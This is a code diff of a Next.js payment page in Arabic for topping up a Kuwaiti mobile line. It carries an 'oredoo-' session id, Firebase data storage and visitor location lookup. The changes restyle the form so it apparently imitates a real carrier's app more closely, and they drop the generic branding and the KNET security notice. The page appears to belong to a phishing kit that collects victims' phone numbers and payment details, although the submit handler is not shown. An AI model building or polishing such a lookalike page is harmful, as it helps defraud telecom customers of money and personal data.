@@ -4,12 +4,9 @@ import { useEffect, useState } from "react"
 import { useRouter } from "next/navigation"
 import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
-import PhoneNumbersGrid from "@/components/pay-page"
-import { ArrowLeft, CreditCard, DollarSign, Phone } from "lucide-react"
+import { ArrowLeft, Receipt } from "lucide-react"
 import { Button } from "@/components/ui/button"
-import PaymentSummary from "@/components/payment-summary"
 import { Input } from "@/components/ui/input"
-import LanguageToggle from "@/components/language-toggle"
 
 export default function Page() {
   const router = useRouter()
@@ -17,7 +14,6 @@ export default function Page() {
   const [phone, setPhone] = useState("")
   const [isloading, setIsloading] = useState(false)
   const _id = randstr("oredoo-")
-
 
   function randstr(prefix: string) {
     return Math.random()
@@ -47,12 +43,12 @@ export default function Page() {
       console.error("Error fetching location:", error)
     }
   }
+
   useEffect(() => {
     async function checkCountry() {
       try {
         // Get the country code
-        await getLocation().then((v) => {
-        })
+        await getLocation().then((v) => {})
 
         setIsloading(false)
       } catch (error) {
@@ -80,89 +76,110 @@ export default function Page() {
     localStorage.setItem("total", value)
   }, [value])
 
-    return (
-      <div className="flex flex-col min-h-screen bg-gradient-to-b from-gray-50 to-gray-100">
-      <header className="flex justify-between items-center p-4 bg-white shadow-sm sticky top-0 z-50">
-        <LanguageToggle />
-        <button
-          className="p-2 rounded-full hover:bg-gray-100 transition-colors duration-200 flex items-center gap-2 text-gray-600"
-          onClick={() => router.back()}
-        >
+  return (
+    <div className="flex flex-col min-h-screen bg-white">
+      <header className="flex justify-between items-center p-4 sticky top-0 z-50">
+        <div className="flex items-center gap-2">
+          <div className="flex items-center border border-gray-300 rounded-full px-3 py-1">
+            <span className="text-sm font-medium">English</span>
+            <span className="mx-2 text-gray-400">|</span>
+            <span className="text-sm font-bold text-black">دفع</span>
+          </div>
+        </div>
+        <button className="p-2 flex items-center" onClick={() => router.back()}>
           <ArrowLeft className="w-5 h-5" />
-          <span className="hidden sm:inline text-sm font-medium">Back</span>
         </button>
       </header>
 
-      <div className="w-full max-w-3xl mx-auto px-4 py-6">
-        <div className="relative w-full overflow-hidden rounded-2xl shadow-lg mb-8">
-          <div className="absolute inset-0 bg-gradient-to-r from-red-500/20 to-transparent z-10"></div>
-          <img src="/zf.png" alt="Smart Pay Promotion" className="w-full h-auto object-cover rounded-2xl" />
-          <div className="absolute bottom-4 right-4 z-20 bg-white/90 px-4 py-2 rounded-lg shadow-md">
-            <div className="text-red-600 font-bold text-lg">Smart Pay</div>
-          </div>
+      <div className="w-full px-4 py-2">
+        <div className="relative w-full overflow-hidden rounded-xl mb-6">
+          <img
+            src="/zf.png"
+            alt="Smart Pay Promotion"
+            className="w-full h-auto object-cover rounded-xl"
+          />
         </div>
 
-        <form className="bg-white rounded-2xl shadow-md p-6 sm:p-8 max-w-md mx-auto w-full" onSubmit={handleSubmit}>
-          <h2 className="text-2xl font-bold text-gray-800 text-right mb-6">تفاصيل الدفع</h2>
+        <form className="w-full" onSubmit={handleSubmit}>
+          <div className="flex justify-between mb-2">
+            <div className="text-xl font-bold">رقم الموبايل</div>
+            <div className="text-xl font-bold">المبلغ</div>
+          </div>
 
-          <div className="space-y-6">
-            <div className="space-y-2">
-              <div className="text-right text-lg font-semibold text-gray-700 flex justify-end items-center gap-2">
-                <span>المبلغ</span>
-                <DollarSign className="w-5 h-5 text-gray-500" />
-              </div>
-              <div className="relative">
-                <div className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 font-medium">د.ك</div>
-                <Input
-                  type="tel"
-                  className="text-right pr-4 py-6 text-xl font-medium border-gray-300 focus:border-red-500 focus:ring-red-500 rounded-xl shadow-sm transition-all duration-200"
-                  value={value}
-                  maxLength={4}
-                  onChange={(e) => setValue(e.target.value)}
-                  dir="rtl"
-                />
-              </div>
-            </div>
-
-            <div className="space-y-2">
-              <div className="text-right text-lg font-semibold text-gray-700 flex justify-end items-center gap-2">
-                <span>رقم الموبايل</span>
-                <Phone className="w-5 h-5 text-gray-500" />
-              </div>
+          <div className="flex gap-3 mb-4">
+            <div className="flex-1">
               <Input
                 type="tel"
                 maxLength={10}
-                className="text-right pr-4 py-6 border-gray-300 focus:border-red-500 focus:ring-red-500 rounded-xl shadow-sm transition-all duration-200"
-                placeholder="أدخل رقم الهاتف"
+                className="text-right py-6 border-gray-300 rounded-lg text-lg"
+                placeholder=""
                 value={phone}
                 required
                 onChange={(e) => setPhone(e.target.value)}
                 dir="rtl"
               />
             </div>
-
-            <Button
-              disabled
-              className="w-full py-6 mt-4 bg-gray-300 text-gray-600 rounded-xl text-lg font-medium shadow-sm transition-all duration-200 flex items-center justify-center gap-2"
-            >
-              <span>الدفع لرقم آخر</span>
-              <Phone className="w-5 h-5" />
-            </Button>
+            <div className="relative w-32">
+              <Input
+                type="tel"
+                className="text-center py-6 text-lg font-medium border-gray-300 rounded-lg"
+                value={value}
+                maxLength={4}
+                onChange={(e) => setValue(e.target.value)}
+                dir="rtl"
+              />
+              <div className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 font-medium">د.ك</div>
+              <button type="button" className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="24"
+                  height="24"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                  className="lucide lucide-trash-2"
+                >
+                  <path d="M3 6h18" />
+                  <path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6" />
+                  <path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2" />
+                  <line x1="10" x2="10" y1="11" y2="17" />
+                  <line x1="14" x2="14" y1="11" y2="17" />
+                </svg>
+              </button>
+            </div>
           </div>
 
-          <div className="mt-8 border-t border-gray-200 pt-6">
-            <PaymentSummary amount={value} isloading={isloading} />
+          <Button
+            type="button"
+            className="w-full py-6 mb-8 bg-white text-red-500 border border-red-500 rounded-full text-lg font-medium"
+          >
+            الدفع لرقم آخر
+          </Button>
+
+          <div className="flex justify-between items-center mb-2 mt-8">
+            <div className="flex items-center text-gray-700">
+              <Receipt className="w-5 h-5 text-red-500 mr-2" />
+              <div className="text-lg font-medium">إعادة التعبئة / دفع الفواتير</div>
+            </div>
+          </div>
+
+          <div className="flex justify-between items-center mb-6">
+            <div className="text-lg font-bold">د.ك {Number.parseFloat(value).toFixed(3)}</div>
+            <div className="text-lg font-medium">الإجمالي:</div>
           </div>
 
           <Button
             type="submit"
-            className={`w-full py-6 mt-6 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-xl text-lg font-medium shadow-md transition-all duration-300 hover:shadow-lg flex items-center justify-center gap-2 ${isloading ? "opacity-80 cursor-not-allowed" : ""}`}
+            className={`w-full py-6 mt-4 bg-gray-200 text-gray-500 rounded-full text-lg font-medium ${isloading ? "opacity-80 cursor-not-allowed" : ""}`}
             disabled={isloading}
           >
             {isloading ? (
               <>
                 <svg
-                  className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
+                  className="animate-spin -ml-1 mr-3 h-5 w-5 text-gray-500"
                   xmlns="http://www.w3.org/2000/svg"
                   fill="none"
                   viewBox="0 0 24 24"
@@ -178,20 +195,12 @@ export default function Page() {
               </>
             ) : (
               <>
-                <span>متابعة الدفع</span>
-                <CreditCard className="w-5 h-5" />
+                <span>استمرار</span>
               </>
             )}
           </Button>
-
-          <div className="mt-6 text-center text-sm text-gray-500">المدفوعات آمنة ومشفرة بواسطة KNET</div>
         </form>
       </div>
-
-      <footer className="mt-auto py-4 text-center text-sm text-gray-500 bg-white border-t">
-        © {new Date().getFullYear()} Smart Pay. جميع الحقوق محفوظة
-      </footer>
     </div>
-    )
-
+  )
 }
